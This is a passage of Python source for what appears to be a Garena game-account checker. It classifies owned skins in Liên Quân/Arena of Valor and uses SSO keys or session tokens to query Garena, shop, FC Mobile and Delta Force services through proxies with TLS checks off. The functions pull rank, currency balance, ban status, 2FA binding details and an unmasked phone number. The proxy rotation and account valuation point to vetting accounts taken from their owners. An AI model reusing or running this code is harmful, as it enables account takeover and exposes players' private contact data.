    "53704": "Allain Thần mặt trời", "53705": "Allain Bạch kiếm sĩ", "53706": "Allain Hạo thiên khuyển", "53707": "Allain Tình yêu nổi loạn",
    "53708": "Allain Lân sư Vũ thần", "53709": "Allain Cẩm y vệ Xích Hổ", "53800": "Qi", "53801": "Qi Tiểu long",
    "53802": "Qi Đặc vụ cáo tuyết", "53803": "Qi Búp bê Daruma", "53804": "Qi Blogger Ẩm thực", "53805": "Qi Thiếu nữ mùa xuân",
    "53806": "Qi Quán quân", "53807": "Qi Thần phong Hiệp nữ", "53808": "Qi Milim Nava", "53809": "Qi Annie Leonhart",
    "53900": "Lorion", "53901": "Lorion Chiến giáp hắc ám", "53902": "Lorion Hoả vân tà thần", "53903": "Lorion Quân vương bóng tối",
    "53904": "Lorion Quân vương ánh sáng", "53905": "Lorion Giáo chủ tinh hệ", "54000": "Bright", "54001": "Bright Soái ca thánh điện",
    "54002": "Bright Toshiro Hitsugaya", "54003": "Bright Khiêu chiến", "54004": "Bright Mật vụ hacker", "54005": "Bright Kỳ Lân Soái",
    "54006": "Bright Vua về nhì", "54007": "Bright Nhà thám hiểm", "54200": "Tachi", "54201": "Tachi Lãng khách",
    "54202": "Tachi Đao khách vô tình", "54203": "Tachi Xích long hỏa diệm", "54204": "Tachi S-Vinh Quang", "54205": "Tachi Thần phong Hộ vệ",
    "54206": "Tachi Hỗn mang đao", "54207": "Tachi Cần thủ Cyborg", "54300": "Aya", "54301": "Aya Hoạt náo viên",
    "54302": "Aya MC Sóc nhỏ", "54303": "Aya Thủy thủ", "54304": "Aya Điệp viên ký ức", "54305": "Aya Công chúa cầu vồng",
    "54306": "Aya Hỏa Hồ Tiên Ngư", "54307": "Aya Cinnamoroll's Dream", "54309": "Aya Cinnamoroll's Dream", "54400": "Yan",
    "54401": "Yan nhà chế tác", "54402": "Yan Tanjiro Kamado", "54403": "Yan Công tước Norman", "54404": "Yan Giấc mơ sao",
    "54405": "Yan Bích Hạc Phiên Vân", "54406": "Yan Nghệ nhân trung thu", "54500": "Yue", "54501": "Yue Tiểu công Chúa",
    "54502": "Yue Chiêm Tinh gia", "54503": "Yue Vũ phiến hỏa diệm", "54504": "Yue Nữ hoàng Băng giá", "54505": "Yue Hỗn Độn Thần Ma",
    "54507": "Yue Hỗn Độn Thần Ma", "54607": "Teeri Vân Y Cẩm Tú", "54800": "Bijan", "54801": "Bijan Chiến binh sa mạc",
    "54802": "Bijan Hoàng kim cơ giáp", "54803": "Bijan Kình thiên Long Kỵ", "54804": "Bijan Đập vỡ Cây đàn", "54805": "Bijan Lữ Hành Thời Không",
    "54806": "Bijan Giai điệu Giáng Sinh", "56300": "Heino", "56301": "Heino Scout Regiment", "56703": "Erin Tình yêu cổ tích",
    "56704": "Erin Huyễn Ảnh Mị Điệp", "56800": "Ming", "56801": "Ming Thầy tướng", "59500": "Edras",
    "59600": "Goverra", "59601": "Goverra Kỳ Nghỉ Hoàn Mỹ", "59700": "Biron", "59701": "Biron Yuji Itadori",
    "59702": "Biron Võ sĩ Giác đấu", "59800": "Bolt Baron", "59801": "Bolt Baron Thiên Phủ - Tư Mệnh", "59802": "Bolt Baron Lôi vệ",
    "59900": "Billow", "59901": "Billow Thiên Tướng - Độ Ách", "59902": "Billow T-Rex Bất Bại", "59903": "Billow Okarun",
    "152100": "Điêu Thuyền", "152101": "Điêu Thuyền Nữ Vương Anh Đào", "152102": "Điêu Thuyền Hoa Hậu", "152103": "Điêu Thuyền Tiệc bãi biển",
    "152104": "Điêu thuyền Vũ điệu nghê thường", "152105": "Điêu Thuyền Phù thủy bí ngô", "152106": "Điêu Thuyền Tà linh pháp trượng", "152107": "Điêu Thuyền Mèo công nghệ",
    "152108": "Điêu Thuyền Thất Tịch Tiên Tử", "152109": "Điêu Thuyền Thần Ngọc", "152110": "Điêu Thuyền Nữ y tá", "152111": "Điêu Thuyền WaVe",
    "152112": "Eternal Sailor Moon", "152113": "Điêu Thuyền Mối tình đầu", "152114": "Điêu Thuyền Tuế Hàn Đỗ Quyên", "152115": "Điêu Thuyền Nhật Nguyệt Thánh Linh",
}


def _load_external_skins():
    """Dynamically load or update skins from skin_tiers_map.json / skin_id_map.json if present."""
    import json
    base_dirs = [
        os.path.dirname(os.path.abspath(__file__)),
        os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
        os.getcwd(),
    ]
    for d in base_dirs:
        tiers_path = os.path.join(d, "skin_tiers_map.json")
        if os.path.isfile(tiers_path):
            try:
                with open(tiers_path, "r", encoding="utf-8") as f:
                    t_data = json.load(f)
                if isinstance(t_data, dict):
                    if "SSS" in t_data:
                        SKIN_SSS.update(t_data["SSS"])
                    if "SS" in t_data:
                        SKIN_SS.update(t_data["SS"])
                    if "Anime" in t_data:
                        SKIN_ANIME.update(t_data["Anime"])
                    if "Special" in t_data:
                        SKIN_OTHER.update(t_data["Special"])
                    if "HuuHan" in t_data:
                        SKIN_OTHER.update(t_data["HuuHan"])
                    if "SSM" in t_data:
                        SKIN_OTHER.update(t_data["SSM"])
                    if "TuyetSac" in t_data:
                        SKIN_OTHER.update(t_data["TuyetSac"])
                        SKIN_SSS.update(t_data["TuyetSac"])
                    for sid in SKIN_SSS:
                        SKIN_SS.pop(sid, None)
                    break
            except Exception:
                pass

    for d in base_dirs:
        id_path = os.path.join(d, "skin_id_map.json")
        if os.path.isfile(id_path):
            try:
                with open(id_path, "r", encoding="utf-8") as f:
                    id_data = json.load(f)
                if isinstance(id_data, dict):
                    SKIN_ID_MAP.update(id_data)
                    break
            except Exception:
                pass

try:
    _load_external_skins()
except Exception:
    pass


def _classify_skins(owned_ids: list) -> dict:
    """Classify owned skin IDs into SS/SSS/ANIME/OTHER tiers and count unique champions."""
    ss_list, sss_list, anime_list, other_list = [], [], [], []
    prefixes = set()
    for item_id in owned_ids:
        sid = str(item_id)
        matched = False
        if sid in SKIN_SS:
            ss_list.append(SKIN_SS[sid])
            matched = True
        if sid in SKIN_SSS:
            sss_list.append(SKIN_SSS[sid])
            matched = True
        if sid in SKIN_ANIME:
            anime_list.append(SKIN_ANIME[sid])
            matched = True
        if not matched and sid in SKIN_OTHER:
            other_list.append(SKIN_OTHER[sid])
        prefixes.add(sid[:3])
    return {
        "total_skins": len(owned_ids),
        "total_champs": len(prefixes),
        "ss": len(ss_list), "ss_list": ss_list,
        "sss": len(sss_list), "sss_list": sss_list,
        "anime": len(anime_list), "anime_list": anime_list,
        "other": len(other_list), "other_list": other_list,
    }


def _get_app_redirect_url(sock, session_key: bytes, redirect_uri: str) -> str:
    """Use CMD_APP_OAUTH_LOGIN with redirect_uri to obtain a ?code=... login URL."""
    try:
        body = (
            _pf_varint(1, LIEN_QUAN_APP_ID) +
            _pf_str(2, redirect_uri) +
            _pf_varint(3, 1) +
            _pf_str(4, "") +
            _pf_varint(5, 0) +
            _pf_varint(6, CLIENT_PLATFORM_ANDROID)
        )
        hdr, resp = _send_cmd(sock, CMD_APP_OAUTH_LOGIN, body, session_key)
        if hdr.get(5, 0) != 0:
            return ""
        fields = _proto_decode(resp)
        url = fields.get(2, b"")
        return url.decode("utf-8") if isinstance(url, bytes) else str(url)
    except Exception:
        return ""


def _fetch_sale_skins(redirect_url: str, proxy=None) -> dict:
    """Use ?code=... redirect URL to authenticate with sale.lienquan.garena.vn."""
    if not redirect_url:
        return {}
    try:
        sess = requests.Session()
        if proxy:
            sess.proxies = _get_http_proxies(proxy)
        sess.get(redirect_url, allow_redirects=False, verify=False, timeout=6)
        if not sess.cookies:
            return {}

        gql = {
            "operationName": "getUser",
            "variables": {},
            "query": "query getUser { getUser { id name profile { ownedItemIdList cp } } }"
        }
        resp = sess.post("https://sale.lienquan.garena.vn/graphql", json=gql, verify=False, timeout=6)
        result = {}
        if resp.status_code == 200:
            user = (resp.json().get("data") or {}).get("getUser")
            if user:
                profile = user.get("profile") or {}
                owned = profile.get("ownedItemIdList") or []
                owned_int_list = [int(x) for x in owned]
                result = _classify_skins(owned)
                result["cp"] = profile.get("cp", 0)
                result["owned_ids"] = owned_int_list

        try:
            gql_hist = {"query": "{ getItemHistory(limit: 20) { id source extra costStr createdAt itemList } }"}
            rh = sess.post("https://sale.lienquan.garena.vn/graphql", json=gql_hist, verify=False, timeout=6)
            if rh.status_code == 200:
                hist = (rh.json().get("data") or {}).get("getItemHistory") or []
                if hist:
                    result["item_history"] = hist
        except Exception:
            pass
        return result
    except Exception:
        return {}


def _fetch_weekly_profile(access_token: str, proxy=None) -> dict:
    """weeklyreport.moba.garena.vn: player name, rank, rank_id, stars."""
    if not access_token:
        return {}
    try:
        ua = "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36"
        headers = {"Access-Token": access_token, "Partition": "1011", "User-Agent": ua}
        resp = requests.get(
            "https://weeklyreport.moba.garena.vn/api/profile",
            headers=headers, verify=False, timeout=5,
            proxies=_get_http_proxies(proxy)
        )
        if resp.status_code == 200:
            data = resp.json()
            pi = data.get("player_info", {})
            rank_cfg = data.get("rank_config", {})
            rid = pi.get("rank")
            rank_name = ""
            rank_entry = {}
            stars = 0

            # 1. From player_info
            for f in ("star", "stars", "rankStar", "rank_stars", "level", "rankLevel"):
                sv = pi.get(f)
                if sv is not None:
                    try:
                        n = int(sv)
                        if n > 0:
                            stars = n
                            break
                    except (ValueError, TypeError):
                        pass

            # 2. From rank_config
            if rid is not None and str(rid) in rank_cfg:
                rank_entry = rank_cfg[str(rid)] or {}
                rank_name = rank_entry.get("name", "")
                if not stars:
                    for field in ("stars", "star", "level", "sub_rank", "tier_level",
                                  "rank_level", "sub_level", "division", "star_count"):
                        v = rank_entry.get(field)
                        if v is not None:
                            try:
                                n = int(v)
                                if 1 <= n <= 50:
                                    stars = n
                                    break
                            except (ValueError, TypeError):
                                pass

            return {
                "name": pi.get("name", ""),
                "rank": rank_name or (str(rid) if rid else ""),
                "rank_id": rid,
                "rank_stars": stars,
                "rank_entry": rank_entry,
            }
    except Exception:
        pass
    return {}


def _fetch_rov_th_via_termgame(sso_key: str, proxy=None) -> dict:
    """Fetch RoV Thailand role/shells via termgame.com or napthe.vn."""
    if not sso_key:
        return {}

    def _try_shop_site(base_url: str) -> dict:
        try:
            sess = requests.Session()
            sess.verify = False
            if proxy:
                sess.proxies = _get_http_proxies(proxy)
            sess.headers.update({
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
            })

            redir = quote_plus(f"{base_url}app/")
            payload = (
                f"client_id=10017&response_type=token"
                f"&redirect_uri={redir}&format=json&id={int(time.time())}"
            )
            r = sess.post(
                "https://authgop.garena.com/oauth/token/grant",
                data=payload, timeout=8,
                headers={
                    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
                    "cookie": f"sso_key={sso_key}"
                }
            )
            if r.status_code != 200:
                return {}
            access_token = (r.json() or {}).get("access_token", "")
            if not access_token:
                return {}

            r = sess.post(
                f"{base_url}api/auth/inspect_token",
                json={"token": access_token}, timeout=8,
                headers={"accept": "application/json", "content-type": "application/json"}
            )
            if r.status_code != 200:
                return {}
            inspect = r.json() or {}
            set_cookie = r.headers.get("Set-Cookie", "") or ""
            tg_session = ""
            if "session_key=" in set_cookie:
                tg_session = set_cookie.split("session_key=", 1)[1].split(";", 1)[0]
            if not tg_session:
                return {}

            tvs = inspect.get("two_step_verify_status") or {}
            out = {
                "shells": int(inspect.get("shell_balance", 0) or 0),
                "uac": inspect.get("uac", "") or "",
                "tg_username": inspect.get("username", "") or "",
                "_shop_source": base_url,
                "tg_display_mobile": tvs.get("display_mobile_no", "") or "",
                "tg_2fa_bind_time": int(tvs.get("bind_time", 0) or 0),
                "tg_is_verified": bool(inspect.get("is_garena_verified")),
            }

            hdr = {
                "accept": "application/json, text/plain, */*",
                "cookie": f"source=pc; session_key={tg_session}"
            }

            # RoV TH roles (app_id=100055)
            try:
                rr = sess.get(
                    f"{base_url}api/shop/apps/roles?app_id=100055&region=IN.TH&language=th&source=pc",
                    timeout=8, headers=hdr
                )
                if rr.status_code == 200:
                    roles_list = (rr.json() or {}).get("100055") or []
                    if roles_list:
                        role = roles_list[0]
                        out["rov_role_name"] = role.get("role", "") or ""
                        out["rov_role_id"] = int(role.get("role_id", 0) or 0)
                        out["rov_server"] = role.get("server", "") or ""
                        out["rov_server_id"] = int(role.get("server_id", 0) or 0)
                        out["rov_packed_role_id"] = int(role.get("packed_role_id", 0) or 0)
                        out["rov_open_id"] = role.get("open_id", "") or ""
                        out["has_rov_role"] = bool(out["rov_role_id"])
            except Exception:
                pass

            # AoV VN roles (app_id=100054)
            try:
                rr = sess.get(
                    f"{base_url}api/shop/apps/roles?app_id=100054&language=vi&source=pc",
                    timeout=8, headers=hdr
                )
                if rr.status_code == 200:
                    aov_list = (rr.json() or {}).get("100054") or []
                    if aov_list:
                        aov_role = aov_list[0]
                        out["aov_tg_name"] = aov_role.get("role", "") or ""
                        out["aov_server"] = aov_role.get("server", "") or ""
                        out["aov_server_id"] = int(aov_role.get("server_id", 0) or 0)
                        out["aov_open_id"] = aov_role.get("open_id", "") or ""
            except Exception:
                pass

            return out
        except Exception:
            return {}

    for base in ("https://termgame.com/", "https://napthe.vn/"):
        res = _try_shop_site(base)
        if res:
            return res
    return {}


def _fetch_fc_prefill_via_sso(sso_key: str, proxy=None) -> str:
    """Fetch unmasked prefill_mobile using specific headers."""
    if not sso_key:
        return ""
    try:
        grant_post_data = (
            f"client_id=100155&response_type=token&redirect_uri=gop100155%3A%2F%2F"
            f"&login_scenario=normal&format=json&id={round(time.time() * 1000)}"
        )
        grant_headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GarenaMSDK/5.12.0 (iPhone15,3;ios - 18.6;vi-JP;JP",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/x-www-form-urlencoded;charset=utf-8",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Accept-Language": "vi-VN,vi;q=0.9",
            "Origin": "https://100155.connect.garena.com",
            "Referer": "https://100155.connect.garena.com/universal/oauth?locale=vi_JP&platform=1&response_type=token&login_scenario=normal&client_id=100155&display=embedded&redirect_uri=gop100155%3A%2F%2F",
            "Cookie": f"sso_key={sso_key}"
        }
        grant_url = "https://100155.connect.garena.com/oauth/token/grant"
        grant_response = requests.post(
            grant_url, data=grant_post_data, headers=grant_headers,
            timeout=7, verify=False, proxies=_get_http_proxies(proxy)
        )
        access_token = grant_response.json().get("access_token", "")
        if not access_token:
            return ""

        headers2 = {
            "User-Agent": "GarenaMSDK/5.12.1(SM-S908N ;Android 9;vi;vn;)",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "If-Modified-Since": "Thu, 05 Mar 2026 02:22:02 GMT",
        }
        response = requests.get(
            f"https://100155.connect.garena.com/api/v1/game/local-requirement/user-info?app_id=100155&region=VN&access_token={access_token}",
            headers=headers2, timeout=7, verify=False, proxies=_get_http_proxies(proxy)
        )
        return response.json().get("data", {}).get("prefill_mobile", "")
    except Exception:
        pass
    return ""


def _df_sign_url(path: str, params: dict = None) -> str:
    """Build a signed URL for Delta Force sg-act API calls."""
    u = str(uuid.uuid4())
    ts = str(int(time.time()))
    qs = f"u={u}&a=10005&ts={ts}"
    if params:
        extra = "&".join(f"{k}={v}" for k, v in params.items())
        qs = extra + "&" + qs
    full = f"{path}?{qs}"
    sig = hashlib.md5(f"/{full}&appkey=intel#!2022$act".encode()).hexdigest()
    return f"{full}&s={sig}"


def _fetch_delta_force_info(sso_key: str, proxy=None) -> dict:
    """Fetch Delta Force (playerinfinite) account info via Garena SSO key."""
    if not sso_key:
        return {}
    out = {}
    proxies = _get_http_proxies(proxy)
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
    try:
        grant_data = (
            f"client_id={DF_GARENA_CLIENT_ID}&response_type=token"
            f"&redirect_uri=https%3A%2F%2Fcommon-web.intlgame.com%2Fjssdk%2Fgarenalogincallback.html"
            f"&format=json&id={int(time.time())}"
        )
        r = requests.post(
            "https://authgop.garena.com/oauth/token/grant",
            data=grant_data, timeout=8, verify=False,
            headers={
                "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
                "User-Agent": ua,
                "Cookie": f"sso_key={sso_key}",
            },
            proxies=proxies,
        )
        if r.status_code != 200:
            return out
        garena = r.json() or {}
        garena_token = garena.get("access_token", "")
        garena_openid = garena.get("open_id", "") or str(garena.get("uid", ""))
        if not garena_token:
            return out
        out["df_garena_token"] = True

        ts_ms = str(int(time.time() * 1000))
        intl_body = {
            "device_info": {
                "guest_id": str(uuid.uuid4()),
                "lang_type": "en",
                "app_version": "0.0",
                "screen_height": 864, "screen_width": 1536,
                "device_brand": "Google Inc.",
                "device_model": ua,
                "network_type": "4g",
                "ram_total": 8, "rom_total": 8,
                "cpu_name": "Win32",
                "android_imei": "", "ios_idfa": "",
                "page": "https%3A%2F%2Fwww.playdeltaforce.com%2Fevents%2Fhq%2F",
                "page_with_search": "https%3A%2F%2Fwww.playdeltaforce.com%2Fevents%2Fhq%2F",
                "ts": int(ts_ms),
            },
            "channel_dis": "00000000",
            "channel_info": {
                "thirdType": "garena",
                "token": garena_token,
                "openId": garena_openid,
            },
        }
        intl_params = (
            f"channelid=10&conn=0&gameid=30150&os=5"
            f"&sdk_version=1.22.1&seq=&source=32&ts={ts_ms}"
        )
        intl_r = requests.post(
            f"https://intlsdk-new.iegg.garena.com/v2/auth/login?{intl_params}",
            json=intl_body, timeout=10, verify=False,
            headers={"Content-Type": "application/json", "User-Agent": ua},
            proxies=proxies,
        )
        intl_data = intl_r.json() if intl_r.status_code == 200 else {}
        intl_token = intl_data.get("token", "")
        intl_openid = intl_data.get("openid", "")
        intl_expires = intl_data.get("token_expire_time", "") or intl_data.get("expire_time", "")
        if not intl_token:
            out["df_intl_error"] = intl_data.get("msg", "no token")
            return out
        out["df_intl_ok"] = True

        cms_path = _df_sign_url("api/gpts.auth_svr.AuthSvr/LoginByINTL")
        cms_body = {
            "mappid": 10109,
            "clienttype": 903,
            "login_info": {
                "channel_id": 10,
                "token": intl_token,
                "open_id": intl_openid,
                "channelid": 10,
                "expires": str(intl_expires),
                "game_id": "30150",
                "channel_info": "{}",
            },
        }
        cms_r = requests.post(
            f"https://sg-community.playerinfinite.com/{cms_path}",
            json=cms_body, timeout=10, verify=False,
            headers={"Content-Type": "application/json", "User-Agent": ua},
            proxies=proxies,
        )
        cms_data = cms_r.json() if cms_r.status_code == 200 else {}
        ticket = ""
        uid = ""
        if isinstance(cms_data.get("data"), dict):
            ticket = cms_data["data"].get("ticket", "")
            uid = str(cms_data["data"].get("uid", ""))
        if not ticket:
            out["df_cms_error"] = cms_data.get("msg", "no ticket")
            return out
        out["df_ticket"] = True
        out["df_uid"] = uid

        api_path = _df_sign_url("api/proxy/logicial/DfTools/GetMyData")
        api_body = {"needLogin": True, "seasonno": [], "report_type": 1}
        api_r = requests.post(
            f"https://sg-act.playerinfinite.com/{api_path}",
            json=api_body, timeout=10, verify=False,
            headers={
                "Content-Type": "application/json",
                "User-Agent": ua,
                "X-Ticket": ticket,
                "X-uid": uid,
                "x-gameid": "29158",
                "x-source": "pc_web",
                "x-language": "vi",
                "Origin": "https://www.playdeltaforce.com",
                "Referer": "https://www.playdeltaforce.com/",
            },
            proxies=proxies,
        )
        api_data = api_r.json() if api_r.status_code == 200 else {}
        if api_data.get("code") == 0 and isinstance(api_data.get("data"), dict):
            d = api_data["data"]
            out["df_has_data"] = True
            out["df_nickname"] = d.get("nickname", "") or d.get("name", "")
            out["df_level"] = d.get("level", 0) or d.get("lv", 0)
            out["df_uid_game"] = d.get("uid", "") or uid
            out["df_avatar"] = d.get("avatar", "")
            out["df_raw"] = d
            seasons = d.get("season_data") or d.get("seasons") or []
            if isinstance(seasons, list) and seasons:
                latest = seasons[0] if isinstance(seasons[0], dict) else {}
                out["df_rank"] = latest.get("rank_name", "") or latest.get("rank", "")
                out["df_season"] = latest.get("season_name", "") or latest.get("seasonno", "")
                out["df_matches"] = latest.get("total_match", 0) or latest.get("matches", 0)
                out["df_wins"] = latest.get("win_match", 0) or latest.get("wins", 0)
                out["df_kd"] = latest.get("kd", "") or latest.get("kd_ratio", "")
        else:
            out["df_api_error"] = api_data.get("msg", "no data")
            out["df_api_code"] = api_data.get("code", -1)

        try:
            daily_path = _df_sign_url("api/proxy/logicial/DfTools/GetDailyReport")
            daily_body = {"needLogin": True, "report_type": 1}
            daily_r = requests.post(
                f"https://sg-act.playerinfinite.com/{daily_path}",
                json=daily_body, timeout=8, verify=False,
                headers={
                    "Content-Type": "application/json",
                    "User-Agent": ua,
                    "X-Ticket": ticket,
                    "X-uid": uid,
                    "x-gameid": "29158",
                    "x-source": "pc_web",
                    "x-language": "vi",
                    "Origin": "https://www.playdeltaforce.com",
                    "Referer": "https://www.playdeltaforce.com/",
                },
                proxies=proxies,
            )
            daily_data = daily_r.json() if daily_r.status_code == 200 else {}
            if daily_data.get("code") == 0 and isinstance(daily_data.get("data"), dict):
                out["df_daily"] = daily_data["data"]
        except Exception:
            pass

        return out
    except Exception:
        return out


def _fetch_fc_mobile_vn_user_info(access_token: str, region: str = "VN", proxy=None) -> dict:
    if not access_token:
        return {}
    try:
        params = {"app_id": str(FC_MOBILE_VN_APP_ID), "region": region or "VN", "access_token": access_token}
        resp = requests.get(
            "https://connect.garena.com/api/v1/game/local-requirement/user-info",
            params=params, verify=False, timeout=5, proxies=_get_http_proxies(proxy),
        )
        if resp.status_code == 200:
            data = resp.json()
            if isinstance(data, dict):
                return data
    except Exception:
        pass
    return {}


def _fetch_aov_user_info(access_token: str, region: str = "VN", proxy=None) -> dict:
    if not access_token:
        return {}
    try:
        params = {"app_id": str(LIEN_QUAN_APP_ID), "region": region or "VN", "access_token": access_token}
        resp = requests.get(
            "https://connect.garena.com/api/v1/game/local-requirement/user-info",
            params=params, verify=False, timeout=5, proxies=_get_http_proxies(proxy),
        )
        if resp.status_code == 200:
            data = resp.json()
            if isinstance(data, dict):
                return data
    except Exception:
        pass
    return {}


def _fetch_fcmobile_web_me_session(sess, host: str, path: str = "/api/app/me", proxy=None) -> dict:
    if not sess or not host:
        return {}
    try:
        path = path if str(path or "").startswith("/") else ("/" + str(path or ""))
        url = f"https://{host}{path}"
        headers = {
            "Accept": "application/json, text/plain, */*",
            "X-Requested-With": "com.garena.game.fcmobilevn",
            "User-Agent": "Mozilla/5.0 (Linux; Android 12; SM-A528B Build/V417IR; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36; GarenaMSDK/5.12.1",
            "Referer": f"https://{host}/",
        }
        if proxy:
            sess.proxies = _get_http_proxies(proxy) or {}
        resp = sess.get(url, headers=headers, verify=False, timeout=5, allow_redirects=True)
        if resp.status_code == 200:
            data = resp.json()
            if isinstance(data, dict):
                return data
        return {
            "_status_code": getattr(resp, "status_code", None),
            "_path": path,
            "_text": (getattr(resp, "text", "") or "")[:300],
        }
    except Exception as exc:
        return {"_error": str(exc)}


def _fetch_fcmobile_me_from_access_token(access_token: str, proxy=None) -> dict:
    if not access_token:
        return {}
    hosts = ["liendoan.fcmobile.garena.vn", "hiepphu3.fcmobile.garena.vn"]
    paths = ["/api/app/me", "/api/me", "/api/user/me", "/api/v1/app/me"]
    for h in hosts:
        sess = requests.Session()
        if proxy:
            sess.proxies = _get_http_proxies(proxy) or {}
        base = f"https://{h}"
        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "X-Requested-With": "com.garena.game.fcmobilevn",
            "User-Agent": "Mozilla/5.0 (Linux; Android 12; SM-A528B Build/V417IR; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36; GarenaMSDK/5.12.1",
            "Referer": f"{base}/",
        }
        try:
            if h == "liendoan.fcmobile.garena.vn":
                resp = sess.get(
                    base + "/connect/garena/callback",
                    params={"access_token": access_token, "source_type": "ingame"},
                    headers=headers, verify=False, timeout=5, allow_redirects=True,
                )
            else:
                resp = sess.get(
                    base + "/",
                    params={"garena_token": access_token},
                    headers=headers, verify=False, timeout=5, allow_redirects=True,
                )
            cb = {
                "status_code": getattr(resp, "status_code", None),
                "final_url": getattr(resp, "url", None),
                "ss_fcm": sess.cookies.get("ss_fcm") or "",
                "ff_session": sess.cookies.get("ff_session") or "",
            }
        except Exception as exc:
            cb = {"_error": str(exc), "ss_fcm": "", "ff_session": ""}

        ss = (cb or {}).get("ss_fcm", "") or ""
        ff = (cb or {}).get("ff_session", "") or ""
        if not ss and not ff:
            continue

        for p in paths:
            me = _fetch_fcmobile_web_me_session(sess, h, path=p, proxy=proxy)
            u = me.get("user", {}) if isinstance(me, dict) else {}
            if isinstance(u, dict) and u:
                out = {"host": h, "ss_fcm": ss, "ff_session": ff, "user": u, "path": p}
                out["ovr"] = u.get("ovr")
                out["uid"] = u.get("uid")
                out["name"] = u.get("name")
                out["rankTCN"] = u.get("rankTCN")
                out["rankDDC"] = u.get("rankDDC")
                out["rankDGL"] = u.get("rankDGL")
                out["point"] = u.get("Point")
                return out
    return {}


def _fetch_kientuong_player(sock, session_key: bytes, proxy=None) -> dict:
    """kientuong.lienquan.garena.vn: level, registerTime, banInfo, rank."""
    try:
        body = (
            _pf_varint(1, LIEN_QUAN_APP_ID) +
            _pf_str(2, "https://kientuong.lienquan.garena.vn/auth/login/callback") +
            _pf_varint(3, 1) +
            _pf_str(4, "") +
            _pf_varint(5, 0) +
            _pf_varint(6, CLIENT_PLATFORM_ANDROID)
        )
        hdr, resp = _send_cmd(sock, CMD_APP_OAUTH_LOGIN, body, session_key)
        if hdr.get(5, 0) != 0:
            return {}
        fields = _proto_decode(resp)
        redirect = fields[2].decode("utf-8") if 2 in fields else ""
        if not redirect:
            return {}

        sess = requests.Session()
        if proxy:
            sess.proxies = _get_http_proxies(proxy)
        sess.get(redirect, allow_redirects=False, verify=False, timeout=5)
        if not sess.cookies:
            return {}

        resp2 = sess.get("https://kientuong.lienquan.garena.vn/api/player/get", verify=False, timeout=5)
        if resp2.status_code == 200:
            player = resp2.json().get("player", {})
            reg_ts = player.get("registerTime")
            reg_str = datetime.datetime.fromtimestamp(reg_ts).strftime("%H:%M:%S %d-%m-%Y") if reg_ts else ""

            rank_str = ""
            rank_stars_kt = 0
            for rf in ("rankName", "rank_name", "rank", "tier", "tierName"):
                v = player.get(rf)
                if v:
                    if isinstance(v, dict):
                        rank_str = (v.get("name") or v.get("rankName") or v.get("tierName") or "").strip()
                        rank_stars_kt = int(v.get("stars", 0) or v.get("star", 0) or v.get("level", 0) or 0)
                    elif isinstance(v, str) and v.strip():
                        rank_str = v.strip()
                    if rank_str:
                        break

            ban_payload = [
                player.get("banInfo"),
                player.get("punishInfo"),
                player.get("punishment"),
                {
                    "isBan": player.get("isBan"),
                    "isBanned": player.get("isBanned"),
                    "banned": player.get("banned"),
                    "ban": player.get("ban"),
                    "banStatus": player.get("banStatus"),
                    "status": player.get("status"),
                    "state": player.get("state"),
                    "endTime": player.get("endTime"),
                    "banEndTime": player.get("banEndTime"),
                    "unbanTime": player.get("unbanTime"),
                    "expireAt": player.get("expireAt"),
                    "expiredAt": player.get("expiredAt"),
                    "banTime": player.get("banTime"),
                }
            ]
            return {
                "level": player.get("level", 0),
                "register_time": reg_str,
                "banned": "YES" if _is_banned_info(ban_payload) else "NO",
                "rank": rank_str,
                "rank_stars": rank_stars_kt,
                "_raw_player": player,
            }
    except Exception:
        pass
    return {}


def _translate_aov_rank(rank_str: str) -> str:
    if not rank_str:
        return rank_str
    s = rank_str.lower()
    if "บรอนซ์" in s or "bronze" in s or "青銅" in s:
        return "Đồng"
    if "ซิลเวอร์" in s or "silver" in s or "白銀" in s:
        return "Bạc"
    if "โกลด์" in s or "gold" in s or "黃金" in s:
        return "Vàng"
    if "แพลทินัม" in s or "platinum" in s or "鉑金" in s:
        return "Bạch Kim"
    if "ไดมอนด์" in s or "diamond" in s or "鑽石" in s:
        return "Kim Cương"
    if "คอมมานเดอร์" in s or "commander" in s or "星耀" in s:
        return "Tinh Anh"
    if "กลอเรียสรูเลอร์" in s or "glorious ruler" in s:
        return "Thách Đấu"
    if "ซูพรีมคอนเควอร์เรอร์" in s or "supreme conqueror" in s or "璀璨傳說" in s:
        return "Chiến Tướng"
    if "คอนเควอร์เรอร์" in s or "conqueror" in s or "master" in s or "戰場傳說" in s:
        return "Cao Thủ"
    return rank_str


# ── Status & Verification Helpers ─────────────────────────────────────────────
_PROXY_ERRORS = (
    "Proxy closed connection",
    "Proxy CONNECT failed",
    "No connection could be made",
    "Connection dropped",
    "target machine actively refused",
    "A connection attempt failed",
    "connected party did not properly respond",
    "getaddrinfo failed",
    "Connection refused",
)


def _is_yes(value) -> bool:
    if isinstance(value, bool):
        return value
    if isinstance(value, (int, float)):
        return value != 0
    if isinstance(value, str):
        return value.strip().upper() in {"YES", "Y", "TRUE", "1", "ON", "BAN", "BANNED"}
    return False


def _is_banned_info(ban_info) -> bool:
    if ban_info is None:
        return False
    if _is_yes(ban_info):
        return True
    if isinstance(ban_info, str):
        s = ban_info.strip().lower()
        if not s or s in {"no", "none", "null", "false", "0", "ok", "unbanned", "not_banned", "not banned"}:
            return False
        return "ban" in s and "unban" not in s
